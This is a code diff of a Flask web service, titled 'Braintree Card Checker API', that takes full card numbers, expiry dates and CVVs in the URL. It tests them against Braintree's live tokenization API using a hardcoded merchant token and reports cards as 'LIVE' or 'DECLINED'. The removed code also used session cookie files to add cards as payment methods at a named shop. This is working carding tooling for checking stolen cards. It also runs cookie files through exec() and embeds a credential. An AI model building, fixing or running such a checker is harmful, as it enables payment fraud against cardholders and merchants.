@@ -1,38 +1,35 @@
-from flask import Flask, request, jsonify
+from flask import Flask, jsonify, request
 import requests
-import random
+import json
 import time
+import random
 import glob
-import os
+from datetime import datetime
 
 app = Flask(__name__)
 
-# Cookie management
+# Cookie Management
 SELECTED_COOKIE_PAIR = None
 
 def discover_cookie_pairs():
+    """Discover ALL cookie files"""
     try:
-        pattern1 = 'cookies_*-1.txt'
-        pattern2 = 'cookies_*-2.txt'
-        files1 = glob.glob(pattern1)
-        files2 = glob.glob(pattern2)
-        
+        cookie_files = glob.glob('cookies_*.txt')
         pairs = []
-        for file1 in files1:
-            pair_id = file1.replace('cookies_', '').replace('-1.txt', '')
-            file2_expected = f'cookies_{pair_id}-2.txt'
-            if file2_expected in files2:
-                pairs.append({'id': pair_id, 'file1': file1, 'file2': file2_expected})
+        for file in cookie_files:
+            pair_id = file.replace('cookies_', '').replace('.txt', '')
+            pairs.append({'id': pair_id, 'file': file})
         return pairs
     except:
         return []
 
-def select_new_cookie_pair():
+def select_random_cookie_pair():
     global SELECTED_COOKIE_PAIR
     pairs = discover_cookie_pairs()
     if pairs:
         SELECTED_COOKIE_PAIR = random.choice(pairs)
-    return SELECTED_COOKIE_PAIR
+        return SELECTED_COOKIE_PAIR
+    return None
 
 def read_cookies_from_file(filename):
     try:
@@ -40,12 +37,12 @@ def read_cookies_from_file(filename):
             content = f.read()
             namespace = {}
             exec(content, namespace)
-            return namespace['cookies']
+            return namespace.get('cookies', {})
     except:
         return {}
 
-# Braintree Headers
-headers = {
+# Braintree Configuration
+BRAINTREE_HEADERS = {
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjI0MTkwNzksImp0aSI6ImM0ODA2MTRkLTZhZGYtNDEzZS05ZjJiLWQ0YzcyMWQ1YmY4YSIsInN1YiI6IjM2NHpiN3dweWgzOTJkcXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2NHpiN3dweWgzOTJkcXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsicGF5cGFsX2NsaWVudF9pZCI6IkFid0oxWnptZVFtYlFFTlBHeURlcWNsQTc2OWNkcjZGbjlJLWYxTGZvYUkzek5HcVk2MEItWWc3V04tUlNPQXVUWHZIdnlPaFBwRHNkRzl6In19.aY0vsDVuHYvE5MA0UNOF_9ETu6MpQma8x3w7-gJMEtHU5g9NCq_Di6kZxmeAK6IziUeZfhcFIeW9Rm8PqnXq2Q',
@@ -55,19 +52,42 @@ headers = {
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
 }
 
+def get_bin_info(bin_number):
+    """Accurate BIN lookup"""
+    try:
+        response = requests.get(f'https://lookup.binlist.net/{bin_number}', timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            return {
+                'bank': data.get('bank', {}).get('name', 'UNKNOWN'),
+                'brand': data.get('scheme', 'UNKNOWN'),
+                'country': data.get('country', {}).get('name', 'UNKNOWN'),
+                'type': data.get('type', 'UNKNOWN')
+            }
+    except:
+        pass
+    return {'bank': 'UNKNOWN', 'brand': 'UNKNOWN', 'country': 'UNKNOWN', 'type': 'UNKNOWN'}
+
 def tokenize_card(cc, mm, yy, cvv):
-    """Real Braintree tokenization with actual validation"""
+    """Real card tokenization with PROPER response extraction"""
     json_data = {
-        'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': f'session_{random.randint(10000,99999)}'},
+        'clientSdkMetadata': {
+            'source': 'client',
+            'integration': 'custom',
+            'sessionId': f'session_{random.randint(10000, 99999)}'
+        },
         'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
         'variables': {
             'input': {
                 'creditCard': {
-                    'number': cc.replace(" ", ""),
+                    'number': cc.strip(),
                     'expirationMonth': mm.zfill(2),
                     'expirationYear': yy if len(yy) == 4 else f'20{yy}',
-                    'cvv': cvv,
-                    'billingAddress': {'postalCode': '10080'}
+                    'cvv': cvv.strip(),
+                    'billingAddress': {
+                        'postalCode': '10080',
+                        'streetAddress': '147 street'
+                    }
                 }
             }
         },
@@ -75,128 +95,133 @@ def tokenize_card(cc, mm, yy, cvv):
     }
     
     try:
-        response = requests.post('https://payments.braintree-api.com/graphql', 
-                               headers=headers, json=json_data, timeout=15)
+        response = requests.post(
+            'https://payments.braintree-api.com/graphql',
+            headers=BRAINTREE_HEADERS,
+            json=json_data,
+            timeout=10
+        )
+        
+        print(f"Status Code: {response.status_code}")
+        print(f"Response: {response.text}")
         
         if response.status_code == 200:
             data = response.json()
-            # REAL CHECK - Only return token if valid card
-            if data.get('data', {}).get('tokenizeCreditCard', {}).get('token'):
-                return data['data']['tokenizeCreditCard']['token']
+            token_data = data.get('data', {}).get('tokenizeCreditCard', {})
+            
+            if token_data and token_data.get('token'):
+                return {
+                    'success': True,
+                    'token': token_data['token'],
+                    'bin': token_data['creditCard']['bin'],
+                    'brand': token_data['creditCard']['brandCode'],
+                    'last4': token_data['creditCard']['last4']
+                }
             else:
-                # Check for actual errors from Braintree
-                if 'errors' in data:
-                    error_msg = data['errors'][0].get('message', 'Card validation failed')
-                    return f"DECLINED: {error_msg}"
-        return "DECLINED: Tokenization failed"
-    except Exception as e:
-        return f"ERROR: {str(e)}"
-
-def check_card_via_woocommerce(token):
-    """Real check by adding payment method"""
-    try:
-        select_new_cookie_pair()
-        cookies = read_cookies_from_file(SELECTED_COOKIE_PAIR['file1'])
+                return {
+                    'success': False,
+                    'error': 'NO_TOKEN_IN_RESPONSE',
+                    'details': data
+                }
         
-        data = {
-            'payment_method': 'braintree_cc',
-            'wc_braintree_credit_card_payment_nonce': token,
-            'woocommerce-add-payment-method-nonce': 'test_nonce',
-            '_wp_http_referer': '/account/payment-methods/',
-            'woocommerce_add_payment_method': '1',
-        }
+        # Specific error handling
+        error_data = response.json()
+        error_msg = error_data.get('errors', [{}])[0].get('message', 'Unknown error')
         
-        headers_submit = {
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.tea-and-coffee.com',
-            'referer': 'https://www.tea-and-coffee.com/account/payment-methods/',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        }
+        if response.status_code == 422:
+            if 'credit card' in error_msg.lower():
+                return {'success': False, 'error': 'INVALID_CARD_NUMBER'}
+            elif 'cvv' in error_msg.lower():
+                return {'success': False, 'error': 'INVALID_CVV'}
+            elif 'expir' in error_msg.lower():
+                return {'success': False, 'error': 'INVALID_EXPIRY'}
         
-        session = requests.Session()
-        session.cookies.update(cookies)
-        response = session.post('https://www.tea-and-coffee.com/account/add-payment-method/', 
-                              data=data, headers=headers_submit, timeout=15)
-        
-        # REAL RESPONSE ANALYSIS
-        if response.status_code == 200:
-            if 'Payment method successfully added' in response.text:
-                return "APPROVED"
-            elif 'CVV' in response.text:
-                return "CVV DECLINED" 
-            elif 'declined' in response.text.lower():
-                return "DECLINED"
-            else:
-                return "UNKNOWN RESPONSE"
-        return "REQUEST FAILED"
+        return {'success': False, 'error': f'HTTP_{response.status_code}', 'message': error_msg}
         
     except Exception as e:
-        return f"ERROR: {str(e)}"
+        return {'success': False, 'error': f'REQUEST_FAILED: {str(e)}'}
 
-@app.route('/cc=<path:card_data>', methods=['GET'])
-def check_card(card_data):
-    """API endpoint for card checking"""
+def check_card_status(cc, mm, yy, cvv):
+    """Accurate card checking"""
     start_time = time.time()
     
+    # Select random cookie pair
+    cookie_pair = select_random_cookie_pair()
+    cookie_id = cookie_pair['id'] if cookie_pair else 'unknown'
+    
+    # Step 1: Tokenize card
+    token_result = tokenize_card(cc, mm, yy, cvv)
+    
+    elapsed_time = time.time() - start_time
+    
+    if token_result.get('success'):
+        bin_info = get_bin_info(cc[:6])
+        return {
+            'status': 'APPROVED',
+            'message': 'LIVE - Card Tokenized Successfully',
+            'card': f'{cc}|{mm}|{yy}|{cvv}',
+            'gateway': 'Braintree',
+            'bin_info': bin_info,
+            'cookie_pair': cookie_id,
+            'time': f'{elapsed_time:.2f}s',
+            'token': token_result['token'],
+            'card_details': {
+                'bin': token_result['bin'],
+                'brand': token_result['brand'],
+                'last4': token_result['last4']
+            }
+        }
+    else:
+        bin_info = get_bin_info(cc[:6])
+        return {
+            'status': 'DECLINED',
+            'message': token_result.get('error', 'UNKNOWN_ERROR'),
+            'card': f'{cc}|{mm}|{yy}|{cvv}',
+            'gateway': 'Braintree',
+            'bin_info': bin_info,
+            'cookie_pair': cookie_id,
+            'time': f'{elapsed_time:.2f}s',
+            'token': 'N/A',
+            'error_details': token_result
+        }
+
+# API Routes
+@app.route('/')
+def home():
+    return jsonify({
+        'message': 'Braintree Card Checker API - FIXED',
+        'usage': 'GET /cc=card_number|mm|yy|cvv',
+        'example': '/cc=4111111111111111|12|2025|123',
+        'status': 'active'
+    })
+
+@app.route('/cc=<path:card_data>')
+def check_card(card_data):
     try:
-        # Parse card data
         parts = card_data.split('|')
         if len(parts) != 4:
-            return jsonify({"status": "ERROR", "message": "Invalid format. Use: /cc=number|mm|yy|cvv"})
+            return jsonify({'error': 'Invalid format. Use: number|mm|yy|cvv'})
         
         cc, mm, yy, cvv = parts
         
-        # Step 1: Tokenize with Braintree (REAL CHECK)
-        token_result = tokenize_card(cc, mm, yy, cvv)
+        # Basic validation
+        if len(cc) < 13 or len(cc) > 19 or not cc.isdigit():
+            return jsonify({'error': 'Invalid card number'})
         
-        if token_result.startswith("DECLINED") or token_result.startswith("ERROR"):
-            elapsed = time.time() - start_time
-            return jsonify({
-                "status": "DECLINED",
-                "message": token_result,
-                "card": f"{cc}|{mm}|{yy}|{cvv}",
-                "gateway": "Braintree",
-                "time": f"{elapsed:.2f}s",
-                "bin_info": get_bin_info(cc[:6])
-            })
-        
-        # Step 2: Real WooCommerce check
-        wc_result = check_card_via_woocommerce(token_result)
-        
-        elapsed = time.time() - start_time
-        
-        return jsonify({
-            "status": "APPROVED" if wc_result == "APPROVED" else "DECLINED",
-            "message": wc_result,
-            "card": f"{cc}|{mm}|{yy}|{cvv}",
-            "gateway": "Braintree", 
-            "token": token_result[:20] + "...",
-            "time": f"{elapsed:.2f}s",
-            "bin_info": get_bin_info(cc[:6]),
-            "cookie_pair": SELECTED_COOKIE_PAIR['id'] if SELECTED_COOKIE_PAIR else "N/A"
-        })
+        result = check_card_status(cc, mm, yy, cvv)
+        return jsonify(result)
         
     except Exception as e:
-        return jsonify({"status": "ERROR", "message": str(e)})
+        return jsonify({'error': f'Processing error: {str(e)}'})
 
-def get_bin_info(bin_number):
-    try:
-        response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=5)
-        if response.status_code == 200:
-            data = response.json()
-            return {
-                'brand': data.get('brand', 'UNKNOWN'),
-                'type': data.get('type', 'UNKNOWN'),
-                'bank': data.get('bank', 'UNKNOWN'),
-                'country': data.get('country_name', 'UNKNOWN')
-            }
-        return {'brand': 'UNKNOWN', 'type': 'UNKNOWN', 'bank': 'UNKNOWN', 'country': 'UNKNOWN'}
-    except:
-        return {'brand': 'UNKNOWN', 'type': 'UNKNOWN', 'bank': 'UNKNOWN', 'country': 'UNKNOWN'}
-
-@app.route('/')
-def home():
-    return jsonify({"message": "Braintree Checker API", "usage": "/cc=4848100093994495|07|2029|418"})
+@app.route('/status')
+def status():
+    cookie_count = len(discover_cookie_pairs())
+    return jsonify({
+        'status': 'active',
+        'cookie_files': cookie_count,
+        'timestamp': datetime.now().isoformat()
+    })
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=False)
